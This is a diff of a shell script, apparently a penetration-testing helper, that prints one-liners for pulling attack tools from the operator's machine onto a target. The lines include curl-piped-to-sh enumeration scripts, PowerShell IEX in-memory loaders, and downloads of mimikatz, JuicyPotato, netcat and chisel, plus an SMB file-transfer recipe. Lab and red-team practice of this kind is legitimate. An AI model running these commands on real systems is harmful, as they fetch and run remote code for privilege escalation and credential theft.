@@ -10,55 +10,58 @@ Comment='\033[0;36m' # Cyan
 End='\033[0m'		 # No Color
 Point='\033[0;31m[*]\033[0m'
 
+runServer=""
 port=$1
 ip=$(/sbin/ip -o -4 addr list tun0 | awk '{print $4}' | cut -d/ -f1) 2>/dev/null
-
-# if [ "$port" == "" ]; then
-# 	port=6666 # default port
-# fi
+host=$ip
 
 if [ "$ip" == "" ]; then
 	ip=$(/sbin/ip -o -4 addr list eth0 | awk '{print $4}' | cut -d/ -f1)
 fi
 
-echo -e "${Frame}###${End} http://$ip ${Frame}###${End}\n"
+if [ -n "$port" ]; then
+	host="$ip:$1" # port is 80 by default
+	runServer="true"
+fi
+
+echo -e "${Frame}###${End} http://$host ${Frame}###${End}\n"
 
 echo -e "${Frame}###${End} ${Title}Linux Local Enum Scripts${End} ${Frame}###${End}"
-echo -e "${Point} curl http://$ip/linpeas.sh | sh"
-echo -e "    wget http://$ip/linpeas.sh -O /tmp/linpeas.sh; chmod +x /tmp/linpeas.sh"
-echo -e "${Point} curl http://$ip/LinEnum.sh | sh"
-echo -e "    wget http://$ip/LinEnum.sh -O /tmp/LinEnum.sh; chmod +x /tmp/LinEnum.sh"
-echo -e "${Point} curl http://$ip/deepce.sh | sh"
-echo -e "    wget http://$ip/deepce.sh -O /tmp/deepce.sh; chmod +x /tmp/deepce.sh"
+echo -e "${Point} curl http://$host/linpeas.sh | sh"
+echo -e "    wget http://$host/linpeas.sh -O /tmp/linpeas.sh; chmod +x /tmp/linpeas.sh"
+echo -e "${Point} curl http://$host/LinEnum.sh | sh"
+echo -e "    wget http://$host/LinEnum.sh -O /tmp/LinEnum.sh; chmod +x /tmp/LinEnum.sh"
+echo -e "${Point} curl http://$host/deepce.sh | sh"
+echo -e "    wget http://$host/deepce.sh -O /tmp/deepce.sh; chmod +x /tmp/deepce.sh"
 echo -e ""
 
 
 echo -e "${Frame}###${End} ${Title}Linux Local Enum Binaries${End} ${Frame}###${End}"
-echo -e "${Point} wget http://$ip/pspy32 -O /tmp/pspy32; chmod +x /tmp/pspy32"
-echo -e "${Point} wget http://$ip/pspy64 -O /tmp/pspy64; chmod +x /tmp/pspy64"
+echo -e "${Point} wget http://$host/pspy32 -O /tmp/pspy32; chmod +x /tmp/pspy32"
+echo -e "${Point} wget http://$host/pspy64 -O /tmp/pspy64; chmod +x /tmp/pspy64"
 echo -e ""
 
 
 echo -e "${Frame}###${End} ${Title}Windows Local Enum Scripts${End} ${Frame}###${End}"
-echo -e "${Point} Powershell \"IEX (New-Object Net.WebClient).Downloadstring('http://$ip/jaws-enum.ps1');\" ${Comment}# run on memory${End}"
-echo -e "${Point} Powershell \"IEX (New-Object Net.WebClient).Downloadstring('http://$ip/Sherlock.ps1'); Find-AllVulns;\" ${Comment}# run on memory${End}"
-echo -e "${Point} Powershell \"IEX (New-Object Net.WebClient).Downloadstring('http://$ip/PowerUp.ps1'); Invoke-Allchecks;\" ${Comment}# run on memory${End}"
-echo -e "${Point} Powershell \"IEX (New-Object Net.WebClient).Downloadstring('http://$ip/SharpHound.ps1'); Invoke-BloodHound -CollectAll\" ${Comment}# run on memory${End}"
+echo -e "${Point} Powershell \"IEX (New-Object Net.WebClient).Downloadstring('http://$host/jaws-enum.ps1');\" ${Comment}# run on memory${End}"
+echo -e "${Point} Powershell \"IEX (New-Object Net.WebClient).Downloadstring('http://$host/Sherlock.ps1'); Find-AllVulns;\" ${Comment}# run on memory${End}"
+echo -e "${Point} Powershell \"IEX (New-Object Net.WebClient).Downloadstring('http://$host/PowerUp.ps1'); Invoke-Allchecks;\" ${Comment}# run on memory${End}"
+echo -e "${Point} Powershell \"IEX (New-Object Net.WebClient).Downloadstring('http://$host/SharpHound.ps1'); Invoke-BloodHound -CollectAll\" ${Comment}# run on memory${End}"
 echo -e ""
 
 
 echo -e "${Frame}###${End} ${Title}Windows Binaries${End} ${Frame}###${End}"
-echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$ip/wget.exe','C:\\\Users\\\Public\\\Documents\\\wget.exe')"
-echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$ip/nc.exe','C:\\\Users\\\Public\\\Documents\\\nc.exe')"
-echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$ip/nc.exe','C:\\\Users\\\Public\\\Documents\\\nc64.exe')"
-echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$ip/whoami.exe','C:\\\Users\\\Public\\\Documents\\\whoami.exe')"
-echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$ip/accesschk.exe','C:\\\Users\\\Public\\\Documents\\\accesschk.exe')"
-echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$ip/chisel_windows_amd64.exe','C:\\\Users\\\Public\\\Documents\\\chisel_windows_amd64.exe')"
-echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$ip/winPEASany.exe','C:\\\Users\\\Public\\\Documents\\\winPEAS.exe')"
-echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$ip/mimikatz32.exe','C:\\\Users\\\Public\\\Documents\\\mimikatz32.exe')"
-echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$ip/mimikatz64.exe','C:\\\Users\\\Public\\\Documents\\\mimikatz64.exe')"
-echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$ip/JuicyPotato32.exe','C:\\\Users\\\Public\\\Documents\\\JuicyPotato32.exe')"
-echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$ip/JuicyPotato64.exe','C:\\\Users\\\Public\\\Documents\\\JuicyPotato64.exe')"
+echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$host/wget.exe','C:\\\Users\\\Public\\\Documents\\\wget.exe')"
+echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$host/nc.exe','C:\\\Users\\\Public\\\Documents\\\nc.exe')"
+echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$host/nc.exe','C:\\\Users\\\Public\\\Documents\\\nc64.exe')"
+echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$host/whoami.exe','C:\\\Users\\\Public\\\Documents\\\whoami.exe')"
+echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$host/accesschk.exe','C:\\\Users\\\Public\\\Documents\\\accesschk.exe')"
+echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$host/chisel_windows_amd64.exe','C:\\\Users\\\Public\\\Documents\\\chisel_windows_amd64.exe')"
+echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$host/winPEASany.exe','C:\\\Users\\\Public\\\Documents\\\winPEAS.exe')"
+echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$host/mimikatz32.exe','C:\\\Users\\\Public\\\Documents\\\mimikatz32.exe')"
+echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$host/mimikatz64.exe','C:\\\Users\\\Public\\\Documents\\\mimikatz64.exe')"
+echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$host/JuicyPotato32.exe','C:\\\Users\\\Public\\\Documents\\\JuicyPotato32.exe')"
+echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$host/JuicyPotato64.exe','C:\\\Users\\\Public\\\Documents\\\JuicyPotato64.exe')"
 echo -e ""
 
 
@@ -67,6 +70,8 @@ echo -e "${Point} impacket-smbserver share . -username evil -password evil -smb2
 echo -e "    net use * \\\\\\$ip\share /u:evil evil"
 echo -e "    copy Z:\\\kali_to_target.exe"
 echo -e "    copy target_to_kali.txt Z:\\"
-echo -e "    \\\\\\10.10.14.23\\\share\\\file.exe ${Comment}# run executable${End}"
+echo -e "    \\\\\\$ip\\\share\\\file.exe ${Comment}# run executable${End}"
 
-
+if [ "$runServer" == "true" ]; then
+	sudo python3 -m http.server $port --directory /var/www/html
+fi
